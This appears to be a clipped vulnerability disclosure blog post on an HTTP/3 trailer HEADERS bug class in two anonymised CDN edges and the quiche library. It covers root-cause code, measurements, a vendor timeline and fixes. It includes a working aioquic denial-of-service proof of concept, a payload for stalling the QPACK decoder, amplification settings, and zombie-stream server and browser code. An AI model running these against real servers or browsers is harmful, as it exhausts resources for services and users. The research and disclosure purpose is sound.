---
title: "The Trailer Frame Bug Class: RFC 9114 §4.1 as a Universal HTTP/3 State Machine Attack Surface | Netacoding | Cybersecurity, Assembly & Network Research"
source: https://netacoding.com/posts/h3_trailer_bug_class/
source_host: netacoding.com
clip_date: 2026-10-01T10:26:15+08:00
trace_id: 06341de4-5d61-4920-a11b-ff31da6b32b0
content_hash: 7e3817283307ac8f0f940fcf9d6f939d204c3e483ce07359cfd14849fb1fc27d
status: synced
tags:
  - 协议分析
  - 漏洞分析
series: null
feed_source: Netacoding·协议/逆向
ai_summary: RFC 9114 §4.1 定义的 trailer HEADERS 帧让两套 CDN 边缘与 quiche 客户端在 H3 请求流状态机中走入无处理器的状态转换，导致挂起、QPACK 停顿或僵尸流，厂商均未修补。
ai_summary_style: key-points:weak
images_status:
  total: 0
  succeeded: 0
  failed_urls: []
notion_page_id: 3ec75244-d011-8130-912f-df00c752a187
ioc:
  cves:
    - CVE-2024-24989
    - CVE-2026-40898
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

> 💡 **AI 总结（key-points:weak）**
>
> RFC 9114 §4.1 定义的 trailer HEADERS 帧让两套 CDN 边缘与 quiche 客户端在 H3 请求流状态机中走入无处理器的状态转换，导致挂起、QPACK 停顿或僵尸流，厂商均未修补。
> 
> - **根因代码：** `quic_spdy_stream.cc` 的 `OnTrailingHeadersComplete()` 只在 `fin=true` 时调用 `OnStreamFrame`，`fin=false` 时无 else 分支，FIN 永不投递，`IsDoneReading()` 恒为 false。
> - **触发条件极简：** 无需 DATA 帧，`HEADERS(END_STREAM=false) → HEADERS(END_STREAM=true/false)` 两帧即触发，问题在状态机转换而非 trailer 解析。
> - **CDN-A 表现：** 收到 trailer 后 goroutine 阻塞，约 60 秒后以 `QUIC INTERNAL_ERROR (0x0001)` 关闭；部分连接由空闲清扫器提前以 `0x0000 NO_ERROR` 静默关闭，监控不可见。
> - **CDN-B 表现：** 禁用逐跳头 + trailer 使 QPACK 解码器停顿约 12,200ms，98–100% 返回 `0x0000 NO_ERROR`；250 并发配合 PING/多流放大达 24.9× worker 占用，外部探测握手从 9–13ms 升至 867ms。
> - **客户端僵尸流：** 恶意服务端发送 `END_STREAM=false` 的 trailer 后，quiche 的 `ShouldKeepConnectionAlive()` 恒真、每 ~15s 发 PING，约 67KB/连接，约 15,000 连接即 OOM；僵尸流跨导航存活，且关闭后仍能收到 datagram。
> - **防御缺口与修复：** 失败发生在 HTTP 请求对象创建之前，绕过限流/WAF，攻击带宽仅约 0.15 Mbps；修复应在帧解析边界直接回 `H3_MESSAGE_ERROR (0x010E)` 并重置流，早于 QPACK 解码。

## Abstract

RFC 9114 §4.1 defines the trailer HEADERS frame as a valid, optional component of an HTTP/3 message — a second HEADERS frame sent after the request body, carrying additional metadata. This post documents a bug class triggered by this frame across three independent HTTP/3 implementations: two CDN edge proxy stacks (referred to as CDN-A and CDN-B) and the quiche QUIC library embedded in major Chromium-based browsers.

In all three cases, the trailer HEADERS frame — or a structural equivalent — reaches a point in the H3 request stream state machine where no handler exists for the state transition. The resulting failure modes differ by implementation:

-   **CDN-A (server-side):** Goroutine block → 60-second context deadline → `QUIC INTERNAL_ERROR (0x0001)`
-   **CDN-B (server-side):** QPACK decoder stall → 12,200ms watchdog → `QUIC NO_ERROR (0x0000)`, 24.9× worker amplification confirmed by external latency monitoring
-   **quiche (client-side):** Permanent zombie stream → `ShouldKeepConnectionAlive()` always true → unbounded memory growth → OOM crash

Root cause is traced to `QuicSpdyStream::OnTrailingHeadersComplete()` in `quiche/quic/core/http/quic_spdy_stream.cc`. A fix is proposed.

All findings were reported to the respective vendors. All were closed without a patch.

* * *

## 1\. Background: RFC 9114 §4.1 Trailer Semantics

HTTP/3 (RFC 9114) permits a request to include a *trailer section*: a second HEADERS frame sent after the DATA frame, carrying additional metadata fields. The complete frame sequence for a request with trailers is:

```java
Stream N:
  HEADERS frame  — request headers     (END_STREAM = false)
  DATA frame     — request body        (END_STREAM = false)
  HEADERS frame  — trailer headers     (END_STREAM = true)  ← RFC 9114 §4.1
```

RFC 9114 §4.1 is explicit about this structure:

> “An HTTP message is complete when all the HEADERS frames associated with it have been received, and any DATA frames that have been sent carry the END_STREAM flag.”

The final HEADERS frame — the trailer — **must** carry `END_STREAM=true`. A compliant implementation that receives a trailer HEADERS frame with `END_STREAM=false` is expected to reject it immediately with `H3_MESSAGE_ERROR (0x010E)` per RFC 9114 §4.1.2.

The minimum valid trigger for this bug class does not even require a DATA frame. The two-frame sequence:

```
HEADERS (END_STREAM=false) → HEADERS (END_STREAM=true or false)
```

is sufficient in all tested implementations. The DATA frame is optional — the bug is in the *state machine transition*, not in trailer-specific parsing logic.

* * *

## 2\. Root Cause: quiche Source Analysis

The definitive root cause is in `QuicSpdyStream::OnTrailingHeadersComplete()`, located at:

```
third_party/quiche/src/quiche/quic/core/http/quic_spdy_stream.cc
```

```cpp
void QuicSpdyStream::OnTrailingHeadersComplete(
    bool fin, size_t frame_len, const QuicHeaderList& header_list) {
  trailers_decompressed_ = true;
  if (fin) {
    OnStreamFrame(QuicStreamFrame(id(), fin, 0, absl::string_view()));
  }
  // fin=false: no else branch — FIN never delivered to sequencer
}
```

When `fin=false` (trailer HEADERS frame arrives without `END_STREAM`):

-   `trailers_decompressed_` is set to `true`
-   `OnStreamFrame` is **never called**
-   The stream sequencer receives no FIN

This creates a permanent inconsistent state:

```java
trailers_decompressed_ = true        ← headers parsed
sequencer()->IsClosed()  = false     ← FIN never arrived
IsDoneReading()          = false     ← always false, forever
```

The call chain consequences:

```rust
QuicSpdyStream::IsDoneReading()
  → trailers_decompressed_ = true
  → return sequencer()->IsClosed()     ← permanently false

QuicSession::GetNumActiveStreams()
  → stream_map_.size() - draining - static - zombie
  → zombie CONNECT stream counted as active permanently

QuicSession::ShouldKeepConnectionAlive()
  → GetNumActiveStreams() > 0          ← always true
  → idle timeout never fires
  → QUIC PING keepalive every ~15s
```

The stream is never removed from `stream_map_`. The QUIC connection cannot idle-close.

**The analog on the server side**— where `fin=true` is present but the state machine has no handler for any second HEADERS frame at all — produces structurally equivalent failures: the H3 frame parser successfully decodes the trailer and passes it to a layer that has no defined transition out of its current state, resulting in a blocked goroutine (Go runtime) or a stalled worker thread, depending on the server implementation.

* * *

## 3\. Manifestation 1 — CDN-A: 60-Second Server-Side Goroutine Hang

### Setup

CDN-A is an HTTP/3 edge proxy serving production API endpoints. The trigger is a standard RFC 9114 §4.1 trailer — three frames on one QUIC stream, trailer carrying `END_STREAM=true`.

```
Stream 0:
  HEADERS (request headers, END_STREAM=false)
  DATA    (request body,    END_STREAM=false)
  HEADERS (trailer,         END_STREAM=true)  ← trigger
```

### Observed Behavior

Upon receiving the trailer HEADERS frame, CDN-A’s state machine fails to handle the transition. The connection remains open. No response is sent. After exactly ~60 seconds, CDN-A closes the connection with:

```
QUIC CONNECTION_CLOSE
  Error code: 0x0001 (QUIC INTERNAL_ERROR)
```

RFC 9000 §20.1 defines `INTERNAL_ERROR (0x0001)` as:

> *“The endpoint encountered an internal error and cannot continue with the connection.”*

This is the QUIC error code reserved for **implementation bugs**— not for client protocol violations. A protocol violation from the client would produce `H3_MESSAGE_ERROR (0x010E)`. CDN-A instead reports an internal failure.

The 60-second delay is the fingerprint of a Go context deadline expiring after an unhandled exception or panic. A correctly handled error — even strict immediate rejection — completes in under 100ms.

### Proof of Concept

```python
#!/usr/bin/env python3
"""
H3 trailer crash PoC — CDN-A server-side
Sends an RFC 9114-compliant trailer HEADERS frame to a CDN-A HTTP/3 endpoint.
Expected RFC-compliant response: H3_MESSAGE_ERROR (0x010E), immediate.
Actual response:                 QUIC INTERNAL_ERROR (0x0001), after ~60s.

Requirements: pip install aioquic
"""
import asyncio, ssl, time
from aioquic.asyncio import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived
from aioquic.quic.configuration import QuicConfiguration
from aioquic.quic.events import ConnectionTerminated

TARGET = "<cdnA-h3-endpoint>"
PORT   = 443

REQUEST_BODY = (
    b'{"context":{"client":{"clientName":"WEB",'
    b'"clientVersion":"1.0","hl":"en"}},'
    b'"browseId":"FEhome"}'
)

REQ_HEADERS = [
    (b":method",      b"POST"),
    (b":scheme",      b"https"),
    (b":authority",   TARGET.encode()),
    (b":path",        b"/api/v1/browse"),
    (b"content-type", b"application/json"),
    (b"user-agent",   b"Mozilla/5.0 Chrome/120.0.0.0 Safari/537.36"),
    (b"accept",       b"*/*"),
]
TRAILER = [(b"x-trailer", b"1")]

class TrailerClient(QuicConnectionProtocol):
    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        self._h3         = H3Connection(self._quic)
        self._done       = asyncio.Event()
        self.error_code  = None
        self.terminated  = False
        self.http_status = None

    def quic_event_received(self, event):
        if isinstance(event, ConnectionTerminated):
            self.terminated = True
            self.error_code = event.error_code
            self._done.set()
            return
        for e in self._h3.handle_event(event):
            if isinstance(e, HeadersReceived):
                for name, val in e.headers:
                    if name == b":status":
                        self.http_status = int(val)
                if e.stream_ended:
                    self._done.set()
            elif isinstance(e, DataReceived):
                if e.stream_ended:
                    self._done.set()

    async def run(self):
        sid = self._quic.get_next_available_stream_id(is_unidirectional=False)
        self._h3.send_headers(sid, REQ_HEADERS,  end_stream=False); self.transmit()
        self._h3.send_data(sid,    REQUEST_BODY,  end_stream=False); self.transmit()
        self._h3.send_headers(sid, TRAILER,       end_stream=True);  self.transmit()
        t0 = time.monotonic()
        try:
            await asyncio.wait_for(self._done.wait(), timeout=90.0)
        except asyncio.TimeoutError:
            return None, time.monotonic() - t0, "TIMEOUT"
        elapsed = time.monotonic() - t0
        if self.terminated:
            return self.error_code, elapsed, "TERMINATED"
        return None, elapsed, f"RESPONSE:{self.http_status}"

async def main():
    cfg = QuicConfiguration(is_client=True, alpn_protocols=["h3"])
    cfg.verify_mode = ssl.CERT_NONE
    print(f"[*] Connecting to {TARGET}:{PORT} over HTTP/3 ...")
    print(f"[*] Sending: HEADERS → DATA → HEADERS(trailer)")
    print(f"[*] Waiting up to 90s ...\n")
    async with connect(TARGET, PORT, configuration=cfg,
                       create_protocol=TrailerClient,
                       wait_connected=True) as c:
        await asyncio.sleep(0.1)
        code, elapsed, outcome = await c.run()
    print(f"Outcome    : {outcome}")
    print(f"Error code : 0x{code:04X}" if code is not None else "Error code : None")
    print(f"Elapsed    : {elapsed:.2f}s\n")
    if code == 0x0001:
        print("RESULT : QUIC INTERNAL_ERROR — unhandled exception confirmed")
        print(f"         Server hung {elapsed:.1f}s before terminating")
    elif code == 0x0000:
        print("RESULT : QUIC NO_ERROR — idle sweeper fired before panic propagated")
        print(f"         Worker slot occupied {elapsed:.1f}s, closed silently")
    elif code == 0x010E:
        print("RESULT : H3_MESSAGE_ERROR — RFC-compliant rejection (not vulnerable)")
    elif outcome == "TIMEOUT":
        print("RESULT : Still hanging after 90s")
    elif outcome.startswith("RESPONSE"):
        print("RESULT : Normal HTTP response received")
    else:
        print(f"RESULT : Unexpected error code 0x{code:04X}")

asyncio.run(main())
```

**Output (0x0001 path):**

```
[*] Connecting to <cdnA-h3-endpoint>:443 over HTTP/3 ...
[*] Sending: HEADERS → DATA → HEADERS(trailer)
[*] Waiting up to 90s ...

Outcome    : TERMINATED
Error code : 0x0001
Elapsed    : 60.31s

RESULT : QUIC INTERNAL_ERROR — unhandled exception confirmed
         Server hung 60.3s before terminating
```

**Output (0x0000 path — idle sweeper variant):**

```
Outcome    : TERMINATED
Error code : 0x0000
Elapsed    : 12.19s

RESULT : QUIC NO_ERROR — idle sweeper fired before panic propagated
         Worker slot occupied 12.2s, closed silently
```

Reproduced across 100 sequential connections with zero rate limiting observed. Each connection held server-side resources for the full 60-second context deadline.

### The 0x0000 Variant

In a subset of CDN-A connections, `0x0000 (NO_ERROR)` is returned instead of `0x0001`, at a shorter elapsed time. This occurs when CDN-A’s idle connection sweeper fires before the goroutine panic propagates to the QUIC layer. The sweeper sees an idle connection and closes it “cleanly” — emitting `NO_ERROR` with no error signal, no log entry. From CDN-A’s monitoring perspective, the connection simply timed out normally.

This `0x0000` path is the more operationally dangerous outcome: the server has no visibility into the stall.

### Minimum Trigger

A DATA frame is not required. The minimum trigger is:

```
HEADERS (END_STREAM=false) → HEADERS (END_STREAM=true)
```

This confirms the bug is in the request stream state machine, not in trailer-section validation logic.

* * *

## 4\. Manifestation 2 — CDN-B: QPACK Decoder Stall & Worker Amplification

### Setup

CDN-B is a second major HTTP/3 CDN edge proxy, independently implemented from CDN-A. The trigger differs: the trailer HEADERS frame is combined with RFC 9114 §4.2-forbidden hop-by-hop headers, which causes CDN-B’s QPACK decoder to enter a stall state rather than completing normally.

**Payload (FORB_HBH_1):**

```yaml
HEADERS frame:
  connection: transfer-encoding,keep-alive   ← forbidden, RFC 9114 §4.2
  transfer-encoding: chunked                 ← forbidden, RFC 9114 §4.2
  keep-alive: timeout=5                      ← forbidden, RFC 9114 §4.2

Second HEADERS frame (trailer), END_STREAM=true  ← state machine trigger
```

### Observed Behavior

Two non-deterministic outcomes, same payload:

| Path | Error Code | Duration | Share |
| --- | --- | --- | --- |
| QPACK stall (hang) | `0x0000 NO_ERROR` | ~12,200ms | ~98–100% |
| Transport crash | `0x0001 INTERNAL_ERROR` | ~300ms | ~0–2% |

The dominant path — `0x0000 NO_ERROR` at ~12,200ms — is the QPACK decoder stall. CDN-B’s internal watchdog fires after 12.2 seconds and closes the connection as if it were an idle connection: `NO_ERROR`, no error signal, no internal alert. The worker slot is occupied for the full stall duration with zero visibility to CDN-B’s monitoring.

The minority path — `0x0001 INTERNAL_ERROR` at ~300ms — occurs when CDN-B’s H3 frame checker processes the forbidden headers at the frame layer before QPACK decoding begins (a race condition between two concurrent processing components).

### Empirical Measurements

**Baseline behavior (40 concurrent connections, no amplifier):**

| Metric | Value |
| --- | --- |
| Hang rate | 98–100% per batch |
| Hang avg | 12,243ms (σ ≈ ±50ms) |
| Batch duration | 12.4s (all 40 in parallel) |
| Rate limiting observed | 0   |
| IP blocks triggered | 0   |
| Attack bandwidth | ~0.15 Mbps |

**Worker amplification (250 concurrent connections, combined amplifier):**

| Configuration | Worker-sec/batch | vs Baseline |
| --- | --- | --- |
| Baseline (40 conn, no amp) | 490 ws | 1×  |
| 300 conn + PING keepalive | 2,788 ws | 5.7× |
| 100 conn + 4 streams/conn | 2,644 ws | 5.4× |
| 200 conn + combined | 7,634 ws | 15.6× |
| **250 conn + combined, B04 peak** | **12,184 ws** | **24.9×** |

**B04 batch saturation event (300 connections, combined amplifier):**

-   Normal batch duration: 16s (300 connections processed in parallel)
-   B04 duration: **47.1s**— connections serialized through exhausted worker pool
-   Slowest crash-path connection: 22,484ms (normal: 2–3s)
-   Interpretation: worker pool capacity empirically bounded at 150–250 threads per physical server

### External Latency Confirmation

A concurrent HTTP/3 latency monitor probed CDN-B’s primary domain every second during the 300-connection test, measuring QUIC handshake time and time-to-first-byte independently.

| Period | Handshake | vs Baseline |
| --- | --- | --- |
| Pre-test | 9–13ms | —   |
| During B04 | **867ms** | **66×** |
| After B04 | 75ms | 5.7× |
| Recovery | 9–10ms | Normal |

The 867ms handshake spike occurs precisely during B04. A QUIC handshake that normally completes in 9–13ms taking 867ms indicates the monitor probe hit a worker slot occupied by an attack connection — **external, independent confirmation of server-side resource saturation**.

Immediate return to baseline after batch completion rules out network congestion. This is server-side worker exhaustion.

### The 0x0000 Significance

CDN-B’s `0x0000 NO_ERROR` response means its watchdog cannot distinguish between:

-   A legitimately idle connection (normal idle close)
-   A stuck QPACK decoder worker (stall close)

Both produce identical `NO_ERROR` signals. CDN-B has no internal indication that anything is wrong. This is operationally worse than CDN-A’s `0x0001`: at least `0x0001` signals that something failed internally.

### Rate Limiting Gap

Across all testing:

| Metric | Value |
| --- | --- |
| Total connections | 1,000+ |
| IP blocks | 0   |
| Rate-limit responses (429) | 0   |
| CAPTCHAs | 0   |
| Attack bandwidth | ~0.15 Mbps |

This is architectural, not a misconfiguration. The stall occurs at the QPACK decoder layer — before CDN-B’s rate limiter, WAF, or any HTTP-layer defense is reached. Those systems never see a countable HTTP request.

* * *

## 5\. Manifestation 3 — quiche Client: Zombie Stream & OOM

### Background

WebTransport (RFC 9220) establishes sessions over HTTP/3 CONNECT streams. The session lifecycle from the server’s perspective:

```
Server → Client:  HEADERS (status: 200)               ← session open
         [bidirectional data exchange]
Server → Client:  HEADERS (trailers, END_STREAM=true)  ← proper close
```

The quiche QUIC library is the shared H3 implementation used in major Chromium-based browsers. When the server sends a trailer HEADERS frame with `END_STREAM=false` — a protocol violation, but one a hardened implementation is expected to handle defensively — quiche enters a permanent zombie state per the root cause identified in Section 2.

### State Machine Failure

```cpp
// quiche/quic/core/http/quic_spdy_stream.cc
void QuicSpdyStream::OnTrailingHeadersComplete(
    bool fin, size_t frame_len, const QuicHeaderList& header_list) {
  trailers_decompressed_ = true;
  if (fin) {
    OnStreamFrame(QuicStreamFrame(id(), fin, 0, absl::string_view()));
  }
  // fin=false: no FIN delivered → permanent stall
}
```

Resulting permanent state:

```rust
trailers_decompressed_ = true
sequencer()->IsClosed() = false        ← FIN never arrived
IsDoneReading()         = false        ← always false

QuicSession::ShouldKeepConnectionAlive()
  → GetNumActiveStreams() > 0          ← zombie counted as active
  → true                              ← idle timeout disabled
  → QUIC PING sent every ~15s         ← connection held forever
```

### Memory Exhaustion

A malicious server can open thousands of zombie connections from a single webpage visit. Because Chromium-based browsers enforce no limit on simultaneous WebTransport connections, and because each zombie connection holds its stream state in the Network Service process indefinitely:

| State | Network Service Memory |
| --- | --- |
| Baseline | 6.2 MB |
| After 5,000 zombies | 339.3 MB (+5,373%) |
| Per-connection cost | ~67 KB |
| OOM crash threshold | ~15,000 connections (~1 GB) |

At ~15,000 connections, the Network Service process crashes. All browser tabs simultaneously lose network connectivity. The crash is unrecoverable without a full browser restart.

Zombie connections survive tab navigation, page reloads, and are unaffected by cookie, storage, or cache clearing — they are held at the process level, not the page level.

### Secondary Bug: Post-Zombie Datagram Delivery

After zombie state is established, server→client QUIC datagrams continue to be delivered to the JavaScript `WebTransport.datagrams.readable` stream — even though the H3 layer considers the session closed.

```
[PHASE A] pre-zombie datagram received ✓
[ZOMBIE]  session entered zombie state
[PHASE B] datagrams received after zombie: 6/6  ← BUG
```

This creates a persistent covert channel on a nominally closed session. The session does not appear in any browser API as active, does not trigger idle timeout, and persists across navigations.

### Proof of Concept (Server-Side)

The PoC server sends a WebTransport CONNECT accept (200 OK), followed by a trailer HEADERS frame with `END_STREAM=false`. Full server code and mass amplification harness available in the companion repository.

```python
def send_zombie_trailer(h3: H3Connection, stream_id: int):
    """Send a HEADERS trailer WITHOUT end_stream=True (no FIN)."""
    trailers = [(b"x-zombie", b"1")]
    with h3._get_or_create_stream(stream_id) as stream:
        stream.headers_send_state = HeadersState.AFTER_HEADERS
    frame_data = h3._encode_headers(stream_id, trailers)
    raw_frame = encode_frame(FrameType.HEADERS, frame_data)
    # Send WITHOUT end_stream — this is the trigger
    h3._quic.send_stream_data(stream_id, raw_frame, end_stream=False)
```

**Browser-side confirmation:**

```javascript
const wt = new WebTransport('https://malicious-origin/zombie');
await wt.ready;
// wt.closed never resolves — zombie state confirmed
// QUIC_SESSION events in netlog: PING keepalive every ~15s indefinitely
```

* * *

## 6\. The Threat Model Inversion: Server → Client

The standard threat model for protocol-level bugs assumes an attacker-controlled client sending malformed frames toward a server:

```
Attacker (client) → malformed frame → Server crash / exhaustion
```

This research identified and tested the **inverse threat model**: a malicious origin server sending a malformed trailer frame toward a client.

```
Malicious server → trailer HEADERS (END_STREAM=false) → Client zombie
```

The inversion changes the impact surface fundamentally:

| Model | Attacker Controls | Impact Scope |
| --- | --- | --- |
| Client → Server | Own machine | One server connection per attempt |
| **Server → Client** | **Origin / CDN subdomain / ad network** | **Every visitor’s browser** |

Under the server→client model:

-   A compromised ad network, CDN subdomain, or third-party widget can silently open thousands of zombie connections on every page visitor
-   No user interaction beyond visiting the page
-   No visible UI indication
-   Cross-navigation survival: zombie connections persist at the Network Service level
-   Amplification: 5,000 connections, 339MB memory growth, achievable from a single script on a single malicious page

The key insight: the RFC 9114 §4.1 trailer frame is a **bidirectional attack vector**. The client-side bug is triggered by a server; the server-side bugs are triggered by a client. The specification defines trailer semantics for both directions, and the failure to handle edge cases propagates symmetrically.

* * *

## 7\. Defense Gap: Why HTTP-Layer Controls Cannot Intervene

In all three manifestations, the failure occurs at or below the HTTP/3 frame parsing layer — **before** any HTTP request object is created.

```
UDP packet
  → QUIC layer
  → H3 frame parser          ← FAILURE OCCURS HERE
  → HTTP request object      ← never created
  → Rate limiter / WAF       ← never reached
  → Origin
```

Consequences:

-   **Rate limiters** that operate on HTTP request counts see no request — the connection terminated at the transport layer.
-   **WAF rules** that inspect HTTP headers or bodies never receive input — the frame was processed before promotion to HTTP.
-   **IP-based blocking** is architecturally ineffective for the QPACK stall (CDN-B) because zero rate-limiting responses were observed across 1,000+ connections from a single IP.
-   **Traffic volume thresholds** are not reachable: CDN-B’s QPACK stall attack generates ~0.15 Mbps.

This is structurally analogous to SYN flood attacks bypassing application-layer rate limiting by targeting the TCP stack before connections are established. The same principle applies here at the QUIC/H3 parsing layer.

The only effective mitigation is at the H3 state machine level: immediate rejection of the second HEADERS frame before it reaches any deeper code path.

* * *

## 8\. Cross-Implementation Evidence

Three implementations, two directions, same bug class:

| Implementation | Direction | Trigger | Failure | Error Code | Duration |
| --- | --- | --- | --- | --- | --- |
| CDN-A server | client→server | trailer (END_STREAM=true) | goroutine block | `0x0001` / `0x0000` | 60s / shorter |
| CDN-B server | client→server | forbidden headers + trailer | QPACK decoder stall | `0x0000` (98%) / `0x0001` (2%) | 12,200ms |
| quiche client | server→client | trailer (END_STREAM=false) | zombie stream | N/A (no close) | permanent |

Reference implementations and compliant behavior:

| Implementation | Behavior on trailer |
| --- | --- |
| **Cloudflare** | `H3_MESSAGE_ERROR (0x010E)` — immediate, <100ms — **compliant** |
| CDN-A | `INTERNAL_ERROR (0x0001)` after 60s — **non-compliant** |
| CDN-B | `NO_ERROR (0x0000)` after 12.2s — **non-compliant** |
| quiche (client) | permanent zombie — **non-compliant** |

The two CDN implementations use different codebases and were developed independently. The identical failure class across both — combined with the quiche client-side bug — is consistent with a specification blind spot: RFC 9114 §4.1 defines trailer semantics clearly for the happy path but does not mandate specific handling for the `fin=false` case or for a second HEADERS frame on a request stream that has already reached a committed processing state.

### CVE Precedent

| CVE | Vendor | Mechanism | Similarity |
| --- | --- | --- | --- |
| CVE-2024-24989 | NGINX | HTTP/3 frame sequence → null ptr dereference | Single H3 frame, parser layer crash |
| GHSA-p7c7-7c47-pwch | Envoy | QPACK blocked decoding → worker exhaustion | QPACK stall mechanism (CDN-B analog) |
| GHSA-4grm-h2qv-h6w6 | Netty | QPACK blocked streams → memory exhaustion | Same QPACK class |
| CVE-2026-40898 | quic-go | QPACK trailer expansion → resource exhaustion | Trailer frame as vector |

* * *

## 9\. Disclosure Timeline & Vendor Responses

| Date | Event |
| --- | --- |
| 2026-08-07 | CDN-A server-side reported to Vendor A security program (first submission) |
| 2026-08-07 | Auto-closed by Vendor A within minutes, no human review |
| 2026-08-07 | CDN-B server-side reported to responsible disclosure platform |
| 2026-08-09 | CDN-A re-reported with expanded analysis (“Other” category) |
| 2026-08-09 | Auto-closed by Vendor A again within 2 minutes |
| 2026-08-09 | CDN-A public disclosure (this research) |
| 2026-08-10 | CDN-B closed as Informative: *“closing the connection upon receiving unsupported trailer headers is intentional behavior”* |
| 2026-08-12 | CDN-B QPACK amplification data submitted; closed as *“volumetric attack”*— misclassification |
| 2026-08-16 | quiche client-side reported to Browser Vendor A and Browser Vendor B in parallel |
| 2026-08-16 | Browser Vendor B auto-closed: *“does not meet security reporting criteria — functional/stability issue”* |
| 2026-08-16 | Technical rebuttal submitted to Browser Vendor B; closed 5 minutes later |
| 2026-08-26 | Browser Vendor A closed: *“None severity — availability only; code resides in upstream quiche”* |
| 2026-09-03 | quiche client-side public disclosure |
| **2026-09-04** | **CDN-B re-verified: behavior unremediated. Hang rate 98–100%, avg 12,239ms, identical to August measurements.** |

**Vendor A (CDN-A):** Automated system. No human triage occurred. Vendor A cited “service availability” as outside their security escalation threshold.

**CDN-B:** Closed as “intentional behavior” — the connection close is intentional; the `0x0000 NO_ERROR` signal and 12.2-second worker stall are not. Subsequent closure cited “volumetric attack” — a misclassification. The attack uses ~0.15 Mbps and produces zero rate-limiting responses, placing it outside any volumetric definition.

**Browser Vendor A:** Accurately identified upstream location (quiche). Declined to patch, citing availability-only impact.

**Browser Vendor B:** Automated closure on a report that included source code analysis, heap measurements, and a working PoC.

* * *

## 10\. Remediation

### quiche (Client & Server-Side Root Cause)

The fix for `OnTrailingHeadersComplete`:

```cpp
void QuicSpdyStream::OnTrailingHeadersComplete(
    bool fin, size_t frame_len, const QuicHeaderList& header_list) {
  trailers_decompressed_ = true;
  if (fin) {
    OnStreamFrame(QuicStreamFrame(id(), fin, 0, absl::string_view()));
  } else {
    // RFC 9114 §4.1 violation: trailer without END_STREAM
    // Prevents permanent zombie state
    Reset(QUIC_STREAM_GENERAL_PROTOCOL_ERROR);
  }
}
```

### General H3 State Machine (CDN-A / CDN-B)

Any second HEADERS frame on a request stream should be handled at the **frame parser boundary**, before it reaches QPACK decoding or any deeper processing:

```
if state == AFTER_REQUEST_HEADERS and frame.type == HEADERS:
    send H3_MESSAGE_ERROR (0x010E)
    close stream
    return
```

The check must occur **before** QPACK decoding is attempted. A QPACK decode of a second HEADERS frame that will be rejected is wasted work that can block the decoder.

### Secondary Mitigations (CDN-B Class)

-   Maximum QPACK decoder wait time (e.g., 500ms) with immediate error on timeout
-   Per-connection maximum QPACK-pending stream count (e.g., 5)
-   HTTP/3 forbidden header detection at the frame layer, before QPACK decode

### WebTransport Connection Limit (Browser)

A per-page or per-origin WebTransport connection limit would cap the OOM impact regardless of the stream state bug, and should be implemented independently of the state machine fix.

* * *

## 11\. Conclusion

A single RFC 9114 §4.1 frame type — the trailer HEADERS frame — is sufficient to trigger state machine failures across two independent CDN edge implementations and the quiche client library embedded in major Chromium-based browsers. The failures differ in expression (goroutine hang, QPACK stall, zombie stream) but share a common cause: the H3 request stream state machine has no defined handler for a second HEADERS frame at a point past the initial request parsing commitment.

The threat model inversion — directing a malformed trailer from server toward client — transforms what appears to be a server-side availability bug into a drive-by browser memory exhaustion attack requiring no user interaction beyond a page visit. A single malicious origin, ad network, or compromised CDN subdomain can silently exhaust browser memory across every visitor.

No vendor has issued a patch. CDN-B’s behavior remains unremediated as of September 4, 2026, with hang rates and timing statistically identical to the original August measurements.

The fix in all cases is straightforward: handle the second HEADERS frame at the state machine boundary with an immediate error, before any deeper processing path is committed.

* * *

## Related Research

-   [WebTransport Zombie Connections: RFC 9114 Trailer Frame Triggers Permanent Stream Leak & OOM](https://netacoding.com/posts/webtransport-zombie/)
-   [HTTP/3 Trailer HEADERS Frame Triggers Unhandled Exception in CDN Edge: 60s Hang & QUIC INTERNAL_ERROR 0x0001](https://netacoding.com/posts/blog_post_esf_h3/)
-   [EtherLeak: IP Total Length Over-read via Ethernet Frame Padding](https://netacoding.com/posts/etherleak-reloaded/)
-   [Ghost Leak — Pre-Auth Buffer Over-read via TTL=0 + IP Total Length in ArubaOS](https://netacoding.com/posts/ghost-leak/)
